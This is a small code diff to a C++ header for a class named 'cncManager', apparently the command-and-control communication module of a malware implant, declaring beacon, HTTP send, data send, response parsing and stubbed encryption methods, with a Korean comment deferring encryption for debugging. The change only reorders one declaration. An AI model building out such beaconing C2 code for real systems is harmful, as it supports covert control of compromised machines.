@@ -22,11 +22,10 @@ public:
 	cncManager();
 	cncManager(LPCWSTR server);
 	~cncManager();
+	void responseParser(UCHAR* res, DWORD len);
 	void sendHttpRequest(LPVOID data, DWORD dlen);
 	void sendBeacon();
 	void sendData(UCHAR DDtype, DWORD len, LPVOID stream);
-	void responseParser(UCHAR* response, DWORD len);
-
 	/* 암호화는 디버깅 편의를 위해서 마지막에 구현하는걸로 */
 	LPVOID dataEncrypt(LPVOID data);
 	LPVOID dataDecrypt(LPVOID data);
